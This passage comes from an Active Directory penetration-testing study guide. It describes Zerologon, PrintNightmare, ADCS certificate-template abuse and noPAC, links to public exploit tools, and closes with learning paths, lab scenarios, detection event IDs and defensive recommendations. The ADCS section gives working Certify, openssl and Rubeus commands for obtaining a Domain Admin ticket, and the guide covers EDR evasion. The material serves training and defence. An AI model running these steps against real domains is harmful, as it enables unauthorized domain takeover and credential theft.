  [PoC](https://github.com/thezdi/PoC/tree/master/CVE-2020-0932)

### Zerologon

**What is Zerologon (CVE-2020-1472)?** 
A critical vulnerability in the Netlogon protocol that allows an unauthenticated attacker to reset a Domain Controller's machine account password to a known value, leading to complete domain compromise.

**How it works:**
1. Exploit flaw in Netlogon cryptographic authentication
2. Reset DC's machine account password to empty string
3. Authenticate as the DC using the empty password
4. Perform DCSync to dump all domain credentials
5. Restore the DC's password (important to avoid breaking the domain)

**Requirements:** Network access to a Domain Controller (port 445/TCP)

**Impact:** 
- Instant Domain Admin from unauthenticated attacker
- Complete domain compromise
- Can break domain replication if password not restored

**Mitigations:** Install security updates (August 2020+), enable strict RPC

**Note:** Extremely dangerous; improper use can break the entire domain

- [Zerologon: Unauthenticated domain controller compromise](https://www.secura.com/whitepapers/zerologon-whitepaper): White paper of the vulnerability.
- [SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon): C# implementation of the Zerologon exploit.
- [Invoke-ZeroLogon](https://github.com/BC-SECURITY/Invoke-ZeroLogon): PowerShell implementation of the Zerologon exploit.
- [Zer0Dump](https://github.com/bb00/zer0dump): Python implementation of the Zerologon exploit using the impacket library.

### PrintNightmare

**What is PrintNightmare (CVE-2021-34527)?** 
A critical RCE vulnerability in the Windows Print Spooler service. It allows authenticated users to execute arbitrary code with SYSTEM privileges by loading a malicious DLL through the print spooler service.

**How it works:**
1. Craft a malicious DLL (payload)
2. Host it on an SMB share
3. Use RpcAddPrinterDriverEx to force the Print Spooler to load the DLL
4. DLL executes as SYSTEM
5. Instant local privilege escalation or remote code execution

**Two variants:**
- **Local privilege escalation:** Standard user to SYSTEM
- **Remote code execution:** Domain user to SYSTEM on remote machines

**Requirements:** 
- Authenticated domain user (for RCE variant)
- Print Spooler service running (default on most Windows systems)

**Impact:** Complete compromise of any system with Print Spooler running

**Mitigations:** 
- Disable Print Spooler service if not needed
- Apply security patches
- Implement print server isolation

- [CVE-2021-34527](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527): Vulnerability details.
- [Impacket implementation of PrintNightmare](https://github.com/cube0x0/CVE-2021-1675): Reliable PoC of PrintNightmare using the impacket library.
- [C# Implementation of CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare): Reliable PoC of PrintNightmare written in C#.

### Active Directory Certificate Services

**What is ADCS Abuse?** 
Active Directory Certificate Services (AD CS) issues certificates for authentication. Misconfigured certificate templates can allow attackers to request certificates for other users (including Domain Admins) and use them for authentication.

**Common vulnerable configurations (ESC1):**
- **msPKI-Certificate-Name-Flag** set to ENROLLEE_SUPPLIES_SUBJECT (attacker specifies the certificate's subject)
- Certificate template allows domain users to enroll
- Template includes Client Authentication EKU
- No manager approval required

**How the attack works:**
1. Find vulnerable certificate template
2. Request certificate specifying a Domain Admin's UPN as the subject
3. Receive valid certificate for the DA account
4. Use certificate with Rubeus to request a TGT
5. Authenticate as Domain Admin

**Requirements:** 
- Domain user account
- Vulnerable certificate template
- ADCS server accessible

**Why this is dangerous:** 
- Certificates are valid for months/years
- Password changes don't invalidate certificates
- Harder to detect than password-based attacks

**Check for Vulnerable Certificate Templates with:** [Certify](https://github.com/GhostPack/Certify)

_Note: Certify can be executed with Cobalt Strike's `execute-assembly` command as well_

```powershell
.\Certify.exe find /vulnerable /quiet
```

Make sure the msPKI-Certificates-Name-Flag value is set to "ENROLLEE_SUPPLIES_SUBJECT" and that the Enrollment Rights
allow Domain/Authenticated Users. Additionally, check that the pkiextendedkeyusage parameter contains the "Client Authentication" value as well as that the "Authorized Signatures Required" parameter is set to 0.

This exploit only works because these settings enable server/client authentication, meaning an attacker can specify the UPN of a Domain Admin ("DA")
and use the captured certificate with Rubeus to forge authentication.

_Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target._

Request the DA's Account Certificate with Certify

```powershell
.\Certify.exe request /template:<Template Name> /quiet /ca:"<CA Name>" /domain:<domain.com> /path:CN=Configuration,DC=<domain>,DC=com /altname:<Domain Admin AltName> /machine
```

This should return a valid certificate for the associated DA account.

The exported `cert.pem` and `cert.key` files must be consolidated into a single `cert.pem` file, with one gap of whitespace between the `END RSA PRIVATE KEY` and the `BEGIN CERTIFICATE`.

_Example of `cert.pem`:_

```
-----BEGIN RSA PRIVATE KEY-----
BIIEogIBAAk15x0ID[...]
[...]
[...]
-----END RSA PRIVATE KEY-----

-----BEGIN CERTIFICATE-----
BIIEogIBOmgAwIbSe[...]
[...]
[...]
-----END CERTIFICATE-----
```

#Utilize `openssl` to Convert to PKCS #12 Format

The `openssl` command can be utilized to convert the certificate file into PKCS #12 format (you may be required to enter an export password, which can be anything you like).

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Once the `cert.pfx` file has been exported, upload it to the compromised host (this can be done in a variety of ways, such as with Powershell, SMB, `certutil.exe`, Cobalt Strike's upload functionality, etc.)

After the `cert.pfx` file has been uploaded to the compromised host, [Rubeus](https://github.com/GhostPack/Rubeus) can be used to request a Kerberos TGT for the DA account which will then be imported into memory.

```powershell
.\Rubeus.exe asktht /user:<Domain Admin AltName> /domain:<domain.com> /dc:<Domain Controller IP or Hostname> /certificate:<Local Machine Path to cert.pfx> /nowrap /ptt
```

This should result in a successfully imported ticket, which then enables an attacker to perform various malicious acitivities under DA user context, such as performing a DCSync attack.

### No PAC (sAMAccountName Spoofing)

**What is noPAC/sAMAccountName Spoofing (CVE-2021-42278 & CVE-2021-42287)?** 
A combination of two vulnerabilities allowing privilege escalation from standard domain user to Domain Admin by exploiting how Kerberos handles machine accounts and name resolution.

**How it works:**
1. **CVE-2021-42278:** Create a machine account with sAMAccountName matching a DC (without the trailing $)
2. Request a TGT for this account
3. Rename the account to something else
4. **CVE-2021-42287:** Request a TGS using the TGT; KDC can't find the original account
5. KDC appends $ to the name, finds the actual DC account
6. Returns a TGS for the real DC account
7. Use this TGS to DCSync or perform other DA operations

**Requirements:** 
- Domain user account
- Ability to create machine accounts (default: 10 per user)
- Unpatched Domain Controllers (pre-November 2021 updates)

**Impact:** Instant privilege escalation to Domain Admin

**Mitigations:** 
- Apply November 2021 security updates
- Set ms-DS-MachineAccountQuota to 0
- Monitor machine account creation

- [sAMAccountname Spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing) Exploitation of CVE-2021-42278 and CVE-2021-42287
- [Weaponisation of CVE-2021-42287/CVE-2021-42278](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html) Exploitation of CVE-2021-42278 and CVE-2021-42287
- [noPAC](https://github.com/cube0x0/noPac) C# tool to exploit CVE-2021-42278 and CVE-2021-42287
- [sam-the-admin](https://github.com/WazeHell/sam-the-admin) Python automated tool to exploit CVE-2021-42278 and CVE-2021-42287
- [noPac](https://github.com/Ridter/noPac) Evolution of "sam-the-admin" tool

## Skills to Develop

### Technical Skills

#### 1. **Service Account Exploitation**
- **Kerberoasting:** Request and crack service tickets
- **Hash cracking:** Hashcat, John the Ripper proficiency
- **Wordlist management:** Effective password lists
- **ASREPRoasting:** Exploit accounts without pre-auth
- **SPN enumeration:** Finding all service accounts
- **Targeted attacks:** Forcing SPN registration

#### 2. **Access Control List (ACL) Abuse**
- **ACL enumeration:** PowerView, BloodHound, manual LDAP queries
- **Attack path analysis:** Finding privilege escalation chains
- **Permission modification:** Granting yourself additional rights
- **Password reset attacks:** ForceChangePassword right
- **Group membership manipulation:** AddMember right
- **Object ownership changes:** WriteOwner abuse
- **DACL modification:** WriteDacl exploitation

#### 3. **Delegation Exploitation**
- **Unconstrained delegation discovery:** Finding vulnerable systems
- **TGT extraction:** Capturing cached tickets
- **Printer bug exploitation:** Forcing DC authentication
- **Constrained delegation abuse:** S4U2Self and S4U2Proxy
- **RBCD configuration:** Setting msDS-AllowedToActOnBehalfOfOtherIdentity
- **Machine account creation:** Using ms-DS-MachineAccountQuota
- **Alternative service abuse:** Accessing unintended services

#### 4. **Certificate Services Exploitation**
- **Template enumeration:** Finding vulnerable configurations
- **Certificate request:** Specifying arbitrary subjects
- **Certificate authentication:** Using certs with Rubeus
- **Certificate conversion:** PEM to PFX format
- **ESC1-ESC8 techniques:** Various ADCS attack vectors
- **Certificate theft:** Extracting existing certificates

#### 5. **Credential Harvesting**
- **LSASS dumping:** Multiple techniques and evasion
- **SAM database extraction:** Local account hashes
- **NTDS.dit extraction:** Shadow copy, backup methods
- **DPAPI credential decryption:** Master key usage
- **Group Policy Preferences (GPP):** cPassword decryption
- **Shadow copy enumeration:** Finding backup data

#### 6. **Vulnerability Exploitation**
- **Zerologon:** DC machine account reset
- **PrintNightmare:** Print Spooler RCE
- **PetitPotam:** NTLM relay coercion
- **noPAC/sAMAccountName spoofing:** Privilege escalation
- **MS14-068:** Kerberos PAC validation bypass
- **CVE tracking:** Staying current with AD vulnerabilities

#### 7. **Windows Service Exploitation**
- **DNS Admin abuse:** DLL injection into dns.exe
- **Backup Operators abuse:** SeBackupPrivilege exploitation
- **Print Spooler abuse:** Multiple attack vectors
- **Exchange exploitation:** WriteDacl abuse
- **Service modification:** Changing service binaries/parameters
- **Scheduled task abuse:** Creating privileged tasks

#### 8. **Network Attacks**
- **LLMNR/NBT-NS poisoning:** Credential interception
- **NTLM relay:** Relaying to LDAP, SMB, HTTP
- **IPv6 attacks:** mitm6 exploitation
- **Responder usage:** Network credential capture
- **SMB relay chains:** Multi-hop relay attacks
- **WebDAV coercion:** Forcing authentication

### Analytical Skills

#### 1. **Attack Path Identification**
- Reading BloodHound graphs effectively
- Identifying shortest path to Domain Admin
- Understanding complex permission chains
- Recognizing valuable intermediate targets
- Prioritizing attack vectors by likelihood

#### 2. **Environment Assessment**
- Identifying installed security controls
- Understanding organizational structure
- Recognizing naming conventions
- Identifying high-value targets
- Assessing network segmentation

#### 3. **Risk vs. Reward Analysis**
- Evaluating detection likelihood
- Assessing technique noise levels
- Understanding impact of actions
- Choosing appropriate attack vectors
- Balancing speed vs. stealth

#### 4. **Defensive Understanding**
- Recognizing detection mechanisms
- Understanding blue team capabilities
- Anticipating defensive responses
- Identifying logging gaps
- Knowing when to pivot techniques

### Operational Skills

#### 1. **Tool Mastery**
- **PowerView:** Domain enumeration and ACL abuse
- **BloodHound/SharpHound:** Attack path visualization
- **Rubeus:** Kerberos attack tool
- **Mimikatz:** Credential extraction and manipulation
- **Impacket suite:** Python-based AD tools
- **Certify:** ADCS enumeration and exploitation
- **PowerUpSQL:** SQL Server exploitation
- **Responder/Inveigh:** Network poisoning
- **Custom scripts:** PowerShell and Python automation

#### 2. **Enumeration Methodology**
- Systematic domain enumeration
- User and group enumeration
- Computer and service discovery
- Trust relationship mapping
- GPO enumeration and analysis
- Share and file discovery
- SQL Server discovery

#### 3. **Privilege Escalation Methodology**
- Starting from low-privilege user
- Systematic permission enumeration
- Identifying exploitable configurations
- Chaining multiple vulnerabilities
- Verifying Domain Admin access
- Documenting attack path

#### 4. **Stealth & OPSEC**
- Minimizing detection footprint
- Using living-off-the-land techniques
- Avoiding AV/EDR triggers
- Timing attacks appropriately
- Cleaning up artifacts
- Understanding logging mechanisms

---

## Learning Path Recommendations

### Beginner Level
1. Understand basic AD structure and concepts
2. Learn Kerberos and NTLM authentication fundamentals
3. Master PowerView for enumeration
4. Practice Kerberoasting in lab environment
5. Learn basic ACL concepts and BloodHound usage
6. Understand user, group, and computer objects

### Intermediate Level
1. Master ASREPRoasting techniques
2. Learn delegation types and exploitation
3. Practice ACL abuse and privilege escalation chains
4. Understand GPO structure and abuse
5. Learn NTLM relay attacks
6. Practice credential dumping techniques
7. Study ADCS fundamentals and attacks

### Advanced Level
1. Master RBCD attacks
2. Learn complex ACL escalation paths
3. Exploit ADCS misconfigurations (ESC1-ESC8)
4. Understand and exploit trust relationships
5. Master multiple privilege escalation techniques
6. Learn DNSAdmins and Backup Operators abuse
7. Practice PrintNightmare and Zerologon

### Expert Level
1. Discover novel attack techniques
2. Chain multiple vulnerabilities
3. Bypass advanced security controls
4. Develop custom tools and exploits
5. Contribute to offensive security research
6. Teach and mentor others
7. Understand defensive measures deeply

---

## Recommended Lab Practice

### Lab Setup Requirements
- **Multi-domain environment:** Parent and child domains
- **Various Windows versions:** Mix of Server and Client OS
- **Service accounts:** With SPNs configured
- **Certificate Services:** ADCS deployment
- **Security controls:** EDR, AV for evasion practice
- **Monitoring:** SIEM for blue team perspective
- **Snapshot capability:** Quick rollback for testing

### Practice Scenarios

#### 1. **Kerberoasting Mastery**
- Enumerate all SPNs in domain
- Request service tickets for all accounts
- Crack weak passwords offline
- Target specific high-value service accounts
- Practice OPSEC-safe Kerberoasting (AES tickets)

#### 2. **ASREPRoasting Practice**
- Find accounts without pre-auth required
- Request AS-REP responses
- Crack extracted hashes
- Force disable pre-auth (if write permissions)
- Test password spray correlation

#### 3. **ACL Escalation Paths**
- Use BloodHound to find paths to DA
- Enumerate permissions with PowerView
- Execute multi-hop ACL abuse
- Grant yourself DCSync rights
- Practice stealth ACL modification

#### 4. **Delegation Attacks**
- Find unconstrained delegation systems
- Capture TGTs with printer bug
- Configure RBCD on target computers
- Abuse constrained delegation
- Practice alternative service exploitation

#### 5. **ADCS Exploitation**
- Enumerate certificate templates
- Identify ESC1 vulnerable templates
- Request certificates for Domain Admin
- Convert and use certificates with Rubeus
- Practice persistence via certificates

#### 6. **Trust Exploitation**
- Map trust relationships
- Exploit SID History (child to parent)
- Abuse cross-domain permissions
- Practice inter-realm ticket forging
- Understand trust key extraction

#### 7. **Complex Attack Chains**
- Combine Kerberoasting + password spray
- ACL abuse to RBCD to DA
- NTLM relay to ADCS to authentication
- SQL link traversal to privileged host
- Multi-technique privilege escalation

---

## Detection & Blue Team Awareness

### Key Indicators of Compromise

#### Kerberoasting Detection
- Event ID 4769 (Kerberos Service Ticket Request) with RC4 encryption
- Multiple TGS requests from single user in short timeframe
- Requests for service tickets to uncommon SPNs
- Ticket requests outside normal business hours

#### ASREPRoasting Detection
- Event ID 4768 (Kerberos TGT Request) for accounts without pre-auth
- Multiple failed pre-authentication attempts
- User account modifications to disable pre-auth

#### ACL Abuse Detection
- Event ID 5136 (Directory Service Object Modified)
- Event ID 4662 (Operation performed on AD object)
- Unusual permission changes on privileged groups
- Modifications to msDS-AllowedToActOnBehalfOfOtherIdentity

#### Delegation Abuse Detection
- Event ID 4624 (Logon) with delegation indicators
- Unusual systems performing DCSync (Event ID 4662)
- New machine accounts created (Event ID 4741)
- Changes to delegation settings

#### ADCS Abuse Detection
- Event ID 4886/4887 (Certificate request)
- Certificate requests with unusual SANs
- High volume of certificate enrollments
- Enrollment from unusual users/computers

### Defensive Recommendations
- **Service Accounts:** Use gMSAs, long random passwords (30+ chars)
- **Pre-authentication:** Ensure enabled for all accounts
- **ACL Auditing:** Monitor permission changes on privileged objects
- **Delegation:** Minimize unconstrained delegation, audit changes
- **ADCS Hardening:** Fix vulnerable templates, require manager approval
- **Monitoring:** Enable advanced audit policies, SIEM correlation
- **Tiered Administration:** Separate privileged account tiers
- **Least Privilege:** Minimal permissions for all accounts

---
